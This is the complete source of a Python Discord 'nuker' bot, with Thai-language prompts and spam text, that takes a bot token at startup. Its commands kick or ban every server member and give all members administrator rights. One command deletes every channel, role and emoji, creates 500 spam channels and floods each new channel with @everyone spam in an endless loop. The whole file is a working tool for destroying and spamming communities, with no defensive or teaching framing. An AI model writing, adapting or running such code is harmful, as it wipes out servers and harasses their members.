import discord
from discord.ext import commands
from discord.ext.commands import bot
import asyncio
import time
import random
import os
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter
from colorama import Fore, Style
os.system ("clear")



print("""\033[92m╭━━━━┳━━━┳╮╭━┳━━━┳━╮╱╭┳━━╮╭━━━┳━━━━╮
┃╭╮╭╮┃╭━╮┃┃┃╭┫╭━━┫┃╰╮┃┃╭╮┃┃╭━╮┃╭╮╭╮┃
╰╯┃┃╰┫┃╱┃┃╰╯╯┃╰━━┫╭╮╰╯┃╰╯╰┫┃╱┃┣╯┃┃╰╯
╱╱┃┃╱┃┃╱┃┃╭╮┃┃╭━━┫┃╰╮┃┃╭━╮┃┃╱┃┃╱┃┃
╱╱┃┃╱┃╰━╯┃┃┃╰┫╰━━┫┃╱┃┃┃╰━╯┃╰━╯┃╱┃┃
╱╱╰╯╱╰━━━┻╯╰━┻━━━┻╯╱╰━┻━━━┻━━━╯╱╰╯""")


token = input("\033[95m tokenbot : \033[0m")

os.system ("clear")

SPAM_CHANNEL =  ["ดิสกากจังเลยครับ"]
SPAM_MESSAGE = ["@everyone ดิสกากๆ"]



client = commands.Bot(command_prefix="!")


@client.event
async def on_ready():
   print(Fore.GREEN + f"{client.user.name}:ล็อกอินสำเร็จ:วิธีใช้ !klop หยุด!stop เเบนทุกคน !ball ให้ยศเเอดมินทุกคน !admin เตะทุกคน !kall")
   await client.change_presence(activity=discord.Game(name="ผมตึง"))








@client.command(pass_context=True)
async def kall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
        except:
          pass



@client.command(pass_context=True)
async def admin(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
    except:
      pass


@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
        except:
            pass


@client.command()
async def klop(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("nuke")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("ดิสไก่ๆ")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)